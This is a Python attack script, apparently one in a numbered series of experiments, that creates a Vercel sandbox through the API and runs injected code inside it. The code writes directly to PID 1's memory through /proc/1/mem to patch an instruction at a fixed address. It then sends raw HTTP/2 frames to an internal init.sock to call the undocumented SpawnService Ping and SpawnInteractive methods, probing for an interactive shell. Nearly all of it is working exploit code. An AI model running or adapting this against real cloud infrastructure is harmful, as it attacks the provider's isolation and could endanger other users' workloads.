# -*- coding: utf-8 -*-
"""实验J255: patch 通道存活验证 + patch 后 init.sock 三协议全路径 + Ping 响应内容
前提验证: /proc/1/mem 写 0x83afe0 是否仍可行 (j231 8-21 后可能已修复)
目标: patch 后 h2/grpc/connect 三协议调用 Ping/SpawnInteractive 的响应
判据: patch 失败 -> 线关闭; patch 成功 -> 继续测方法响应
"""
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj255"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# A) patch 通道验证 (j231 同款: /proc/1/mem 写 0x83afe0)
CODE_A = r'''
import os
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
fd = os.open("/proc/1/mem", os.O_RDWR)
def ra(a, n):
    os.lseek(fd, a, 0)
    return os.read(fd, n)
def wa(a, b):
    os.lseek(fd, a, 0)
    return os.write(fd, b)
try:
    old = ra(0x83afe0, 5)
    p("OLD", old.hex())
    if old == bytes.fromhex("e8bb030000"):
        wa(0x83afe0, bytes.fromhex("31c0909090"))
        p("PATCHED", ra(0x83afe0, 5).hex())
    else:
        p("PATTERN_DIFF", old.hex())
    # 存活检查
    r = os.read(fd, 0)
    p("ALIVE", "ok")
except Exception as e:
    p("EXC", type(e).__name__, str(e)[:120])
os.close(fd)
'''
run_cmd(sid, CODE_A, "A_PATCH", timeout=100)

# B) patch 后 init.sock h2 prior-knowledge 调 Ping (SpawnInteractive 同入口探测)
CODE_B = r'''
import socket, ssl, struct, base64
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.settimeout(5)
try:
    sock.connect("/run/vercel/share/init.sock")
    p("CONNECT_OK")
except Exception as e:
    p("CONNECT_ERR", type(e).__name__, str(e)[:100])
    raise SystemExit
# h2 prior knowledge preface
preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
sock.sendall(preface)
# SETTINGS frame
def fr(t, flags, sid, payload):
    return struct.pack(">I", len(payload))[:3] + bytes([t, flags]) + struct.pack(">I", sid & 0x7fffffff) + payload
sock.sendall(fr(4, 0, 0, b""))  # SETTINGS
# HEADERS frame: POST /vercel.sandbox.spawn.v1.SpawnService/Ping (connect/json)
headers = (
    b":method: POST\r\n"
    b":scheme: http\r\n"
    b":path: /vercel.sandbox.spawn.v1.SpawnService/Ping\r\n"
    b":authority: init\r\n"
    b"content-type: application/json\r\n"
    b"connect-protocol-version: 1\r\n"
    b"content-length: 2\r\n"
)
hp = base64.b64encode(headers)
hdr_payload = b"\x00" + hp
sock.sendall(fr(1, 0x4, 1, hdr_payload))  # END_HEADERS
sock.sendall(fr(0, 0x1, 1, b"{}"))        # DATA END_STREAM
# 读响应
data = b""
try:
    while True:
        d = sock.recv(4096)
        if not d:
            break
        data += d
        if len(data) > 20000:
            break
    p("RESP_BYTES", len(data))
    p("RESP", data[:800].hex())
    # ASCII 部分
    asc = "".join(chr(b) if 32 <= b < 127 else "." for b in data)
    p("RESP_ASC", asc[:600])
except Exception as e:
    p("READ_ERR", type(e).__name__, str(e)[:100])
sock.close()
'''
run_cmd(sid, CODE_B, "B_PING_H2", timeout=100)

# C) patch 后 SpawnInteractive (h2) - PTY 流探测
CODE_C = r'''
import socket, struct, base64, time
def p(*a):
    print(" ".join(str(x) for x in a), flush=True)
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.settimeout(6)
try:
    sock.connect("/run/vercel/share/init.sock")
    p("CONNECT_OK")
except Exception as e:
    p("CONNECT_ERR", type(e).__name__, str(e)[:100])
    raise SystemExit
sock.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
def fr(t, flags, sid, payload):
    return struct.pack(">I", len(payload))[:3] + bytes([t, flags]) + struct.pack(">I", sid & 0x7fffffff) + payload
sock.sendall(fr(4, 0, 0, b""))
headers = (
    b":method: POST\r\n"
    b":scheme: http\r\n"
    b":path: /vercel.sandbox.spawn.v1.SpawnService/SpawnInteractive\r\n"
    b":authority: init\r\n"
    b"content-type: application/json\r\n"
    b"connect-protocol-version: 1\r\n"
    b"content-length: 2\r\n"
)
hp = base64.b64encode(headers)
sock.sendall(fr(1, 0x4, 1, b"\x00" + hp))
sock.sendall(fr(0, 0x1, 1, b"{}"))
data = b""
try:
    while True:
        d = sock.recv(4096)
        if not d:
            break
        data += d
        if len(data) > 20000:
            break
    p("RESP_BYTES", len(data))
    p("RESP", data[:600].hex())
    asc = "".join(chr(b) if 32 <= b < 127 else "." for b in data)
    p("RESP_ASC", asc[:600])
except Exception as e:
    p("READ_ERR", type(e).__name__, str(e)[:100])
sock.close()
'''
run_cmd(sid, CODE_C, "C_INTERACTIVE", timeout=100)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
